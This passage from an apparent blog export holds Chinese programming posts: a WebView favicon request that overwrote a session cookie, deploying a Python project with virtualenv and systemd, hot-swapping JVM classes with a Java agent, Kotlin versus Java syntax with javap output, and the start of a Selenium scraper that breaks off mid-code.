    <title><![CDATA[一个favicon.ico图标引发的重大事故]]></title>
    <url>%2F285afbcd%2F</url>
    <content type="text"><![CDATA[也许很难让人相信，一个favicon.ico图标会引起重大事故，而我真的就亲身经历了一回。最近上线的一个项目出现了匪夷所思的事情。如果不去抓包分析，就真的就可以称得上玄学了。 这个项目分为API后端和Android客户端以及嵌入WebView的网页。客户端除了登录和一些基本的API是原生操作以外，其他核心业务都是在WebView加载的网页上进行交互的。项目发布生产环境上线后，部分机型的用户反应核心功能无法使用，在一定程度上造成了很严重的问题。最终定位到问题在ico图标，下面进行详细的分析。在App客户端中嵌入WebView，进行原生和非原生的混合开发在现今依然是成本迭代的产物。在很多场合下API之间的请求越来越多的采用Token机制代替Session，但是Session也有自己的一套自己的完善方案来保证API安全，这里不做Token和Session的对比。 由于项目的特殊性，客户端和服务端的API接口采用Session机制 测试的主要问题如下：1.APP客户端对测试环境的所有请求完全正常，但是在生产环境下，后续页面中的Ajax请求的核心业务异常2.PC浏览器打开对应的网页，无论测试环境还是生产环境，全部都是正常的 针对这个问题，是无法从编码的角度发现的，所以必须抓包分析一下区别根据抓包的数据分析并且找到了问题所在，我把抓到的包 通过下面的测试环境和生产环境的请求时序图简要的罗列了出来。 一、测试环境的请求在混合开发中，客户端和服务端正常的请求响应如下图所示:Android客户端有原生的API请求和WebView请求两个部分，其中登录请求是用Android原生的请求实现的，并且把登录后得到的SessionID通过Cookie同步设置给WebView。这样WebView在后续请求时会自动带上其中绿色的生命线部分代表客户端的WebView（为了偷懒这里简化了时序图） 二、生产环境的请求 通过时序图可知，生产环境下部署了很多项目，其中有个WEB服务的域名为www.pro-web.com,而我们的后端API服务部署在这个域名的子目录下面：www.pro-web.com/api/ 低版本Android的WebView在发起请求时，默认会请求对应域名的favicon.ico资源。这个域名改好被WEB服务A拦截，重新分配了一个SESSIONID给WebView，通过响应头的Set-Cookie将旧的Cookie中的SESSIONID覆盖。由于这个SESSIONID是WEB服务A分配的，导致后续的Ajax请求API服务端时，API服务无法根据SESSIONID找出对应的SESSION，认为该用户没有登录，所以无法进行正常的业务请求。 二、得出的结论由于Android不同版本号的WebView的请求方式有区别，所以在请求接口地址www.pro-web.com/api/的资源时，会自动请求www.pro-web.com域名下的favicon.ico图标。 而且刚好www.pro-web.com这个域名下有其他的Web服务拦截了ico请求,并且重定向到了这个Web服务的其他业务，导致重新分配了一个改Web服务对应的SESSIONID，通过返回体头中的Set-Cookie自动将客户端原本的SESSIONID覆盖。造成了后续服务的不可用。 解决方案1.android的WebView设置不请求网站的favicon.ico资源2.在xxx.html中添加ico资源，优先级最高，这样就不会再去请求ico资源3.相同域名下如果有多个项目，需要为每个项目配置各自的上下文，不能出现上下文嵌套的情况4.使用Token机制进行API接口验证，这样就避免了服务端拦截资源后Set-Cookie把客户端登录时正常的SESSIONID覆盖 方案1：考虑到android开发比较忙，沟通的成本比较大方案3：旧项目的生产环境地址已经用了很久，修改上下文可能会造成其他的服务调用问题。方案4：从Session到Token迁移需要很大的工作量，尤其是已经上线的服务比较多的时候，会牵一发而动全身。 所以最终采用方案2，在API服务端这里做修改xxx.html的head中添加如下：1&lt;link rel="icon" href="data:image/ico;base64,aWNv"&gt; 建议：将每个项目都用不同的二级域名注：即使设置了二级域名，某些内核版本的浏览器依旧会请求favicon.ico图片，如果二级域名找不到，就会到顶级域名查找。如果顶级域名下对应的项目有资源拦截的业务把ico拦截了，那么依然有可能出问题，所以服务端一定要规范。有的时候妥协不是为了相互甩锅和接锅，是为了整个项目能够正常进行，要不断进行尝试，为大局着想。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[部署python项目到linux服务器]]></title>
    <url>%2Fd8d0505b%2F</url>
    <content type="text"><![CDATA[最近用Python写了个外挂，需要部署到Linux环境的服务器上，由于之前本地开发时使用virtualenv，使用这个虚拟环境有个好处是项目中依赖的库不会是全局的，只在当前项目的目录下有效，因为我是Mac系统，virtualenv环境下的库文件和linux上所需要的库不通用，所以不能简单的将整个env拷贝到服务器运行，需要做一些额外的工作。 一般每个不同的项目都会依赖各自的库，有些库的版本不一样会引起冲突，为了解决这个问题，需要使用虚拟环境，Python可以在每个项目目录下创建各自的虚拟环境，项目所依赖的包就在环境目录下，这样避免了库版本的冲突，也方便相同操作系统间可以快速的拷贝项目运行。 我使用的是Python3编写的项目，CentOS 7的服务器上只有Python2，所以需要先安装一下Python3的环境 第一步：安装Python3环境1.首先安装编译环境(后续需要从python官网获取Python3的源码自己编译python)1yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make 2.从官网下载python3的源码1wget https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tar.xz 3.依次执行 解压&gt;进入解压后的目录&gt;编译安装1234tar -xvJf Python-3.6.2.tar.xzcd Python-3.6.2./configure prefix=/usr/local/python3make &amp;&amp; make install 4.安装完毕，创建软连接12345ln -s /usr/local/python3/bin/python3 /usr/bin/python# 执行命令python -V #将会看到python3的版本# 执行命令python2 -V #将会看到python2的版本 5.后续工作，由于执行CentOS的yum命令需要使用自带的python2的版本，所以需要做两处修改123vim /usr/bin/yumvim /usr/libexec/urlgrabber-ext-down#将 这两个文件的 #! /usr/bin/python修改为 #! /usr/bin/python2 第二步：将本地开发环境的依赖项目生成清单文件1.在本地的开发环境中，env下执行：1pip3 freeze &gt;requirements.txt 清单文件将会生成在当前项目目录下，内容如下所示12345certifi==2018.4.16chardet==3.0.4idna==2.7requests==2.19.1urllib3==1.23 将生成后的文件上传到linux服务器 2.将Python项目上传到服务器1#略... 第三步：在linux服务器上为项目创建虚拟环境，并安装项目所需的依赖1.切换到pip3所在的目录 /usr/local/python/bin，执行以下命令1234567891011121314151617# 安装虚拟环境pip3 install virtualenv# 创建虚拟环境 ENVvirtualenv ENV# 切换到虚拟环境所在的目录cd ENV# 启用虚拟环境source ./bin/activate# 安装依赖清单里的库pip3 install -r requirements.txt# 列出当前虚拟环境所安装的依赖库pip3 list 第四步：添加自定义系统服务（很重要）12# 这样的命令在ssh终端退出后，python进程也会被杀掉python xxx.py &amp; 需要创建一个自定义的系统服务，来保证python程序能够在后台运行。 1.创建系统服务1vim /usr/lib/systemd/system/robot.service 内容如下：1234567891011[Unit]Description=robotAfter=network.target [Service]Type=forkingExecStart=/usr/local/python3/bin/ENV/bin/python /usr/local/python3/bin/ENV/p3.py &amp;PrivateTmp=true [Install]WantedBy=multi-user.target ExecStart为服务启动时执行的命令，不能用相对路径， 一定要全路径。这里也可以将命令写到任意的.sh文件中，这里写.sh文件的全路径也是可以的。 2.启用自定义系统服务1systemctl enable robot 3.启动服务1systemctl start robot 可以查看进程，确认一下服务是否启动1ps aux|grep robot 完毕！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态替换JVM中的Class字节码]]></title>
    <url>%2Fb67783e4%2F</url>
    <content type="text"><![CDATA[将程序打包提测，然后测试小姐姐过来跟你说程序有bug的时候就不得不改完bug然后重新替换部署到测试服重新运行。这样不仅非常麻烦而且还浪费了很多时间。既然只是改了一小部分的代码，那我们试想一下能不能动态替换JVM中的的某个类的字节码，达到每次只要更新修改的代码就可以自动进行动态替换，不需要做打包和重启的工作。经过验证发现这种方案是可行的。 我们在本地开发环境编写代码的时候，只要IDE设置了自动刷新，就可以达到不需要重启项目就直接加载修改后的代码的效果。不需要重启项目可以继续调试，一直好奇是如何实现的，经过研究发现，这个功能其实是IDE使用了代理机制去替我们实现的。无论是运行在Tomcat中的项目，还是像Spring Boot这样可以打成jar包运行的项目（内置了Tomcat），在本地开发环境编写的时候都会将class输出到指定目录，IDE实质上是通过检测代码的变化然后编译修改的代码到指定目录的class文件，代理检测到class变化，就把变化的class重新加载到JVM中，实现动态的更新程序。 只要自己编写一个实现网络传输的代理工具，就可以实现不打包不重启项目，直接远程热更新。 在JDK1.5中就引入了agentmain实现了静态代理，需要在启动目标程序时在命令行指定代理jar，这种方式一般不会在生产环境中使用。在JDK1.6中又引入了premain，实现了动态代理，可以不用在目标程序启动时指定，而是以独立的代理程序获取目标程序的JVM的pid动态attach。 其实JVM提供了很多底层API和工具，可以对任意的ASM进行各种操作，只要你对JVM研究的足够深入，脑洞足够大，就可以实现任意你想实现的功能。就像“PHP是世界上最好的语言 ———《PHP官方文档》”，在JVM层可以对字节码进行操作就可以达到动态脚本语言的功能。 下面演示一下如何动态更新JVM中的class1.新建一个普通的工程 AgentDemo新建一个User类并重写toString方法返回User对象的信息123456789101112131415161718/** * 用户信息实体类 * @author 蓝士钦 */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return "姓名："+name +" 年龄："+age; &#125;&#125; 在Main函数中使用循环每隔3秒打印一次User对象信息123456789101112131415161718/** * 程序入口类 * @author 蓝士钦 */public class Main &#123; public static void main(String[] args) &#123; while (true) &#123; System.out.println(new User("蓝士钦", 23)); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 将程序打包成jar包运行1java -jar AgentDemo.jar 程序每隔3秒输出一次User对象信息 接下来使用代理类在不重启目标程序的情况下动态替换User类，通过检测到User.class文件的更新将对应字节码从新加载到JVM中。新建工程LoadAgent。代理程序需要两个文件，一个是用作代理的包含premain方法的java文件，另一个是MANIFEST.MF文件，用来声明premain方法所在的java文件的位置。新建LoadAgent.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package com.lanshiqin.agent;import java.io.DataInputStream;import java.io.File;import java.io.FileInputStream;import java.lang.instrument.ClassDefinition;import java.lang.instrument.Instrumentation;/** * 加载代理类，用来动态替换jvm中的class * * @author 蓝士钦 */public class LoadAgent &#123; public static void premain(String agentArgs, Instrumentation instrumentation) &#123; try &#123; // 监视的User.class所在的路径，此处为了示例演示，先直接硬编码，只监视指定目录下User.class的变化 File f = new File("/Users/lanshiqin/Desktop/out/User.class"); // 开启一个线程，用来监视文件变化 ClassFileWatcher watcher = new ClassFileWatcher(instrumentation, f); watcher.start(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * Class文件监视线程类，用来检测class文件更新 */ private static class ClassFileWatcher extends Thread &#123; private File classFile; private long lastModified; private Instrumentation instrumentation; private boolean firstRun = true; ClassFileWatcher(Instrumentation instrumentation, File classFile) &#123; this.classFile = classFile; this.instrumentation = instrumentation; lastModified = classFile.lastModified(); &#125; @Override public void run() &#123; // 循环检测 while (true) &#123; // 判断是否第一次运行，或者文件最后的修改时间与上一次时间不一致时 if (firstRun || (lastModified != classFile.lastModified())) &#123; firstRun = false; // 更新文件最后修改时间 lastModified = classFile.lastModified(); // 重新加载class reDefineClass(instrumentation, classFile); &#125; try &#123; // 每隔一秒休眠一次 Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; /** * 重新加载Class * @param instrumentation jvm的监视对象 * @param classFile 类文件 */ private static void reDefineClass(Instrumentation instrumentation, File classFile) &#123; byte[] reporterClassFile = new byte[(int) classFile.length()]; DataInputStream in; try &#123; // 读入class文件实例化数据输入流 in = new DataInputStream(new FileInputStream(classFile)); in.readFully(reporterClassFile); in.close(); // 通过读入的class数据输入流实例化类定义对象 ClassDefinition reporterDef = new ClassDefinition(Class.forName("com.lanshiqin.demo.User"), reporterClassFile); // 使用jvm监视对象重新定义类 instrumentation.redefineClasses(reporterDef); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在META-INF目录下的MANIFEST.MF文件中指定 Premain-Class为我们编写的LoadAgent123Manifest-Version: 1.0Premain-Class: com.lanshiqin.agent.LoadAgentCan-Redefine-Classes: true Can-Redefine-Classes: true 是必须要声明的，否则在instrumentation.redefineClasses的时候会抛出异常。 完成后将代理程序打包成jar文件 LoadAgent.jar。 在执行目标程序AgentDemo时，通过-javaagent:xxx.jar指定代理jar，其中xxx为代理jar的文件名。1java -javaagent:LoadAgent.jar -jar AgentDemo.jar 发现控制台现在还是按照jar中的程序在不停的输出编辑User类的toString方法，新增一行输出语句，修改返回的字符串12345678910111213141516171819/** * 用户信息实体类 * @author 蓝士钦 */public class User &#123; private String name; private Integer age; public User(String name, Integer age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; System.out.println("新增的输出语句"); return "我的名字是："+name +" 今年："+age +"岁"; &#125;&#125; 手动将User.java 编译成User.class1javac User.java 手动将生成的User.class复制到指定目录下，观察此时控制台输出的内容 发现我们更新替换了User.class后，原先JVM中的User.class被实时重新加载了，并且最新修改的代码已经实时生效，很酷有没有😎。 上面的示例采用的是静态代理的方式，需要运行目标程序时通过指定参数来运行。一般正式的环境下不会采用这种方式去运行，更多的我们可以考虑采用动态代理的方式。使用独立运行的代理程序，获取目标JVM所在的pid，然后将代理jar动态attach到JVM上。代理类中使用agentmain方法123public static void agentmain(String agentArgs, Instrumentation instrumentation)&#123; // TODO 动态代理&#125; 在入口函数中通过目标JVM的pid，动态的将代理jar attach到目标JVM上。12VirtualMachine virtualMachine = VirtualMachine.attach(pid);virtualMachine.loadAgent("LoadAgent.jar"); 在MANIFEST.MF中指定 Agent-Class:为agentmain方法所在的代理类，指定Main入口函数所在的类123Manifest-Version: 1.0Agent-Class: com.lanshiqin.agent.LoadAgentMain-Class: com.lanshiqin.attach.AttachMain 也许你会觉得采用静态代理，开启一个线程去监听某个class变化的方式很low，确实很low。这里仅仅作为简单的示例演示。我的想法是后续结合服务的做版本控制，比如git提交后使用webhooks触发代理程序将所有修改的class重新加载到JVM中。这篇文章参考了前人的思路，阿里其实已经开源了一个非常完备的解决方案JVM-Sandbox，不仅仅是动态更新JVM中的Class，而且对JVM做了很多高级的操作，比如动态非侵入AOP，有兴趣的可以查阅相关文章 https://mp.weixin.qq.com/s/Nn7Yl6UzRpWnSleKUss8Sw 阿里的JVM沙箱很强大，从中可以学到很多，但我并不需要那么复杂的功能。我想要的很简单，就是想Java程序能够像PHP这类动态脚本程序一样，写完直接刷新，可以不需要重启快速更新到测试服，在JVM层不需要再提什么打包部署，而是可以直接操作Class达到任意功能。 Tomcat的启动和Spring的启动都各自实现了自己的ClassLoad，他们通过破坏双亲委派模式，达到相对高级的操作方式。动态替换JVM中的Class还有很多要深入挖的地方，在后续的文章中会继续记录。]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Kotlin提高开发效率]]></title>
    <url>%2Fa8b16990%2F</url>
    <content type="text"><![CDATA[Kotlin是现代跨平台的静态类型程序设计语言，不仅仅是Android官方支持的开发语言，同时在Web后端也在大量的使用。就我目前的工作而言，已经在完全使用Kotlin来编写基于Spring Boot的后端服务。为什么要使用Kotlin来开发应用？主要是因为它百分之百兼容Java，可以编译成JVM的字节码。Java的各种第三方库和Spring生态成为企业大型应用开发的最佳方案，使用Kotlin可以提高开发效率。 也许是一个时代流行一个语法，好的概念总会被推进，无关语言。最近对比了同样流行的Go语言，发现这两者的语法有异曲同工之处。尤其是Kotlin目前还在试验阶段的协程就和Go的协程非常像，更像是相互借鉴的感觉。kotlin的main函数输出hello，world非常精简123fun main(args: Array&lt;String&gt;) &#123; println("Hello, world!")&#125; kotlin同样借鉴了动态语言，如python的一些语法比如要过滤掉集合中能被2整除的数123456fun main(args: Array&lt;String&gt;) &#123; val numbers = listOf(1, 2, 3) println(numbers.filter(::isOdd))&#125;fun isOdd(x: Int) = x % 2 != 0 kotlin有非常多的新特性，具体可以查阅官网教程，此处不再重复啰嗦。 先从常见的语法进行分析关于变量的使用Java1String str = null; Kotlin1var str: String?=null 也许你会说仅仅是把变量声明放变量名后面而已，方便在哪？除了不用写封号以外，我怎么感觉还多写了？别急，Kotlin可以这样1var str = "this is String Test" 自动类型推断，无需显示声明类型也许你觉得自动类型推断不过如此？别急，看看下面这段代码123456// 获取用户信息集合val userList = userService.userList// 遍历用户for (user in userList)&#123; println(user)&#125; 调用userService的userList方法，将调用的返回值赋值给变量userList,无需指定变量类型，Kotlin将会自动推断，包括变量循环时也无需声明变量类型，全部都会进行自动推断。调用的方法没有参数，所以直接写方法名即可。如果是Java，你需要这样写1234List&lt;User&gt; userList = userService.getUserList();for (User user : userList)&#123; System.out.println(user);&#125; Java需要为接收的变量指定变量类型，你觉得还不够？接着往下看 关于方法的使用在java中，定义一个方法并且返回字符串123public String getInfoString()&#123; return "this is String Test";&#125; 在kotlin中123fun getInfoString(): String &#123; return "this is String Test"&#125; Kotlin使用fun关键字定义一个方法，方法返回类型在方法的括号后面用 ：加类型也许你会觉得这和Java没差多少啊，别急，Kotlin还可以这样1fun getInfoString() = "this is String Test" 方法也支持自动类型推断，够精简了吧？什么？还不够精简？那再对比一下java和kotlin比较两个数的大小，返回大的那个数12345678// 老实人的写法public int max(int a, int b)&#123; if (a&gt;b)&#123; return a; &#125;else&#123; return b; &#125;&#125; kotlin的写法1fun max(a: Int, b: Int) = if (a &gt; b) a else b 除了方法返回值类型自动推断，连流程控制语句里的retrun都不需要也许你觉得也就一般般？还不够？那就接着往下看 流程控制语句123456789101112131415161718192021public static void main(String[] args) &#123; String language; if (args.length == 0) &#123; language = "EN"; &#125; else &#123; language = args[0]; &#125; switch (language) &#123; case "EN": System.out.println("Hello!"); break; case "CN": System.out.println("你好"); break; default: System.out.println("抱歉，不支持当前语言" + language + "的输出"); break; &#125; &#125; 在java中，你会发现你写了很多重复的代码，比如case和break关键字，并且整个代码变得非常的沉长。Kotlin可以这么写12345678fun main(args: Array&lt;String&gt;)&#123; val language = if (args.isEmpty()) "EN" else args[0] println(when (language)&#123; "EN" -&gt; "Hello!" "CN" -&gt; "你好!" else -&gt; "抱歉，支持当前语言$language 的输出" &#125;)&#125; Kotlin使用when代替Java中的switch语句，case匹配可以和lambada表达式一样精简的写法，可以在println中直接输出整个表达式，字符串内部可以使用美元符号$加变量名进行变量表达式输出。 也许你觉得其实也就这样而已？那继续往下看！123456789fun cases(obj: Any)&#123; when(obj)&#123; 1 -&gt; println("One") "Hello" -&gt; println("你好") is Long -&gt; println("Long") !is String -&gt; println("不是字符串") else -&gt; println("未知") &#125;&#125; 在Kotlin中使用Any表示Object类型，when语句比java的switch语句要强大很多。如果是Java中去做匹配Object类型的操作,需要swtich case中用instanceof去匹配，java代码我已经无力写下去了1//java略... 下面来分析主要的几个部分，Kotlin简洁语法的背后到底为我们做了什么？Kotlin编译成JVM字节码后到底是什么样的？关于简单的语法糖我们可以直接在IDEA一层一层往下翻，另外一些编译时生成的则需要通过反编译字节码。 接下来分析一个例子：用Java来写一个POJO类，类里面有3个私有的成员变量，然后要提供公共的get\set方法。User.java123456789101112131415161718192021222324252627282930313233343536373839public class User &#123; /** * 姓名 */ private String name; /** * 性别 */ private String sex; /** * 年龄 */ private Integer age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getSex() &#123; return sex; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125;&#125; 通过属性私有，方法公开的方式来对类进行封装，代码很多，而且很繁琐有没有？虽然get/set可以自动生成，但其实这种模板化的代码干脆就不要出现在代码里，除非要单独封装某个属性值 使用Kotlin来写POJO类就变得非常精简，只需要几行就可以了，在类前使用data关键字修饰，类体用()小括号包裹，里面定义成员变量即可。编译后的class文件会自动为我们添加上属性的get/set方法，并且重写toString()、hashCode()、equals()方法，以及构造函数和一些特殊方法。User.kt12345data class User( var name: String?=null, var sex: String?=null, var age: Int?=null) 口说无凭，你说有get/set就真的有?真的会生成带参和无参的构造函数？凭什么？为了一探究竟，接下来直接反编译class字节码，看看Kotlin写的代码对应的JVM字节码到底是什么样的 为了翻遍查看对应类的信息，这里使用javap -c 并将class文件反编译后的数据输出到一个txt文件上1javap -c User.class &gt; User.txt 反编译后的class字节码文件 User.txt内容如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248Compiled from "User.kt"public final class com.lanshiqin.springboot.User &#123; public final java.lang.String getName(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final void setName(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #11 // Field name:Ljava/lang/String; 5: return public final java.lang.String getSex(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final void setSex(java.lang.String); Code: 0: aload_0 1: aload_1 2: putfield #20 // Field sex:Ljava/lang/String; 5: return public final java.lang.Integer getAge(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final void setAge(java.lang.Integer); Code: 0: aload_0 1: aload_1 2: putfield #27 // Field age:Ljava/lang/Integer; 5: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: aload_0 1: invokespecial #34 // Method java/lang/Object."&lt;init&gt;":()V 4: aload_0 5: aload_1 6: putfield #11 // Field name:Ljava/lang/String; 9: aload_0 10: aload_2 11: putfield #20 // Field sex:Ljava/lang/String; 14: aload_0 15: aload_3 16: putfield #27 // Field age:Ljava/lang/Integer; 19: return public com.lanshiqin.springboot.User(java.lang.String, java.lang.String, java.lang.Integer, int, kotlin.jvm.internal.DefaultConstructorMarker); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aconst_null 8: checkcast #37 // class java/lang/String 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aconst_null 20: checkcast #37 // class java/lang/String 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aconst_null 32: checkcast #39 // class java/lang/Integer 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 43: return public com.lanshiqin.springboot.User(); Code: 0: aload_0 1: aconst_null 2: aconst_null 3: aconst_null 4: bipush 7 6: aconst_null 7: invokespecial #43 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;ILkotlin/jvm/internal/DefaultConstructorMarker;)V 10: return public final java.lang.String component1(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: areturn public final java.lang.String component2(); Code: 0: aload_0 1: getfield #20 // Field sex:Ljava/lang/String; 4: areturn public final java.lang.Integer component3(); Code: 0: aload_0 1: getfield #27 // Field age:Ljava/lang/Integer; 4: areturn public final com.lanshiqin.springboot.User copy(java.lang.String, java.lang.String, java.lang.Integer); Code: 0: new #2 // class com/lanshiqin/springboot/User 3: dup 4: aload_1 5: aload_2 6: aload_3 7: invokespecial #41 // Method "&lt;init&gt;":(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)V 10: areturn public static com.lanshiqin.springboot.User copy$default(com.lanshiqin.springboot.User, java.lang.String, java.lang.String, java.lang.Integer, int, java.lang.Object); Code: 0: iload 4 2: iconst_1 3: iand 4: ifeq 12 7: aload_0 8: getfield #11 // Field name:Ljava/lang/String; 11: astore_1 12: iload 4 14: iconst_2 15: iand 16: ifeq 24 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: astore_2 24: iload 4 26: iconst_4 27: iand 28: ifeq 36 31: aload_0 32: getfield #27 // Field age:Ljava/lang/Integer; 35: astore_3 36: aload_0 37: aload_1 38: aload_2 39: aload_3 40: invokevirtual #53 // Method copy:(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Lcom/lanshiqin/springboot/User; 43: areturn public java.lang.String toString(); Code: 0: new #56 // class java/lang/StringBuilder 3: dup 4: invokespecial #57 // Method java/lang/StringBuilder."&lt;init&gt;":()V 7: ldc #59 // String User(name= 9: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 12: aload_0 13: getfield #11 // Field name:Ljava/lang/String; 16: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 19: ldc #65 // String , sex= 21: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 24: aload_0 25: getfield #20 // Field sex:Ljava/lang/String; 28: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 31: ldc #67 // String , age= 33: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 36: aload_0 37: getfield #27 // Field age:Ljava/lang/Integer; 40: invokevirtual #70 // Method java/lang/StringBuilder.append:(Ljava/lang/Object;)Ljava/lang/StringBuilder; 43: ldc #72 // String ) 45: invokevirtual #63 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 48: invokevirtual #74 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 51: areturn public int hashCode(); Code: 0: aload_0 1: getfield #11 // Field name:Ljava/lang/String; 4: dup 5: ifnull 14 8: invokevirtual #78 // Method java/lang/Object.hashCode:()I 11: goto 16 14: pop 15: iconst_0 16: bipush 31 18: imul 19: aload_0 20: getfield #20 // Field sex:Ljava/lang/String; 23: dup 24: ifnull 33 27: invokevirtual #78 // Method java/lang/Object.hashCode:()I 30: goto 35 33: pop 34: iconst_0 35: iadd 36: bipush 31 38: imul 39: aload_0 40: getfield #27 // Field age:Ljava/lang/Integer; 43: dup 44: ifnull 53 47: invokevirtual #78 // Method java/lang/Object.hashCode:()I 50: goto 55 53: pop 54: iconst_0 55: iadd 56: ireturn public boolean equals(java.lang.Object); Code: 0: aload_0 1: aload_1 2: if_acmpeq 59 5: aload_1 6: instanceof #2 // class com/lanshiqin/springboot/User 9: ifeq 61 12: aload_1 13: checkcast #2 // class com/lanshiqin/springboot/User 16: astore_2 17: aload_0 18: getfield #11 // Field name:Ljava/lang/String; 21: aload_2 22: getfield #11 // Field name:Ljava/lang/String; 25: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 28: ifeq 61 31: aload_0 32: getfield #20 // Field sex:Ljava/lang/String; 35: aload_2 36: getfield #20 // Field sex:Ljava/lang/String; 39: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 42: ifeq 61 45: aload_0 46: getfield #27 // Field age:Ljava/lang/Integer; 49: aload_2 50: getfield #27 // Field age:Ljava/lang/Integer; 53: invokestatic #86 // Method kotlin/jvm/internal/Intrinsics.areEqual:(Ljava/lang/Object;Ljava/lang/Object;)Z 56: ifeq 61 59: iconst_1 60: ireturn 61: iconst_0 62: ireturn&#125; 可以看到使用data修饰的POJO类的Kotlin代码编译后，不仅仅默认为我们生成了get/set方法，还重写了toString()、hashCode()、equals()方法,还有构造函数和特有的方法，另外我们还发现了类和所有的方法默认都是使用final作为修饰符的，这些特性对于快速开发非常有用。其余的字节码指令部分后续再分析，挖个坑，今天先写到这。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Python自动化获取全国每个城市的车牌代码]]></title>
    <url>%2F675a168f%2F</url>
    <content type="text"><![CDATA[最近有这样一需求，需要获取12123交管查询网站上的全国每个城市对应的城市id和车牌代码。最初的想法是直接用Python写个爬虫，遍历每个城市，然后用Xpath提取DOM节点数据就好了。然而在实际操作中发现城市id的DOM节点如果用简单的获取网页数据的爬虫是取不到id值的，这个城市id值必须用浏览器打开的方式去访问，然后网站的js脚本再动态的将城市id插入DOM节点。于是乎想到了用自动化测试工具来做，使用selenium库来操作webdriver，驱动Chrome浏览器进行自动化操作。 由于这个网站有一点特殊，并没有在同一个页面中有全部城市的id和车牌代码，每个城市都是一个单独的二级域名链接。并且城市id使用js动态加载，所以这里就用蠢一点的方法，自动获取到每个城市的链接,然后用浏览器自动化模式去逐个访问再Xpath提取出内容。 当然，这里的重复劳动力交给计算机就好，我们只需要把程序写好。 使用Chrome浏览器打开12123的城市列表选择页面 http://m.12123.com/city.html右键，审查元素，发现所有的城市都在ul 的 li标签下。只需要把li的元素Xpath拷贝出来，提取到城市列表后遍历每个列表的链接，再用浏览器自动化去访问每个城市的链接，最后用相同的方法提取出数据即可。拷贝出来的Xpath如下1/html/body/div[2]/div[3]/ul/li 用Xpath的方式有个好处就是不需要写复杂的正则表达式就可以快速提取到DOM元素的数据。 我要实现的功能： 自动获取全国所有的城市对应的id和车牌代码 将获取到的数据写入到文件，输出为SQL的insert语句 全部代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162"""12123.com 交管查询助手获取所有的 城市名称+城市车牌代码+城市id生成SQL insert语句create by 蓝士钦 2018-06-10"""import requestsfrom lxml import etreefrom selenium import webdriverimport datetime# 12123.com 交管查询网站移动版网址HOST_URL = 'http://m.12123.com'def get_city_info(file_name): # 请求城市列表页面，并用xpath提取所有的城市列表集合 html = requests.get(HOST_URL + '/city.html') select = etree.HTML(html.text) content = select.xpath('/html/body/div[2]/div[3]/ul/li') # 打开指定文件，准备将请求到的数据写入到文件中 file = open(file_name, 'w') # 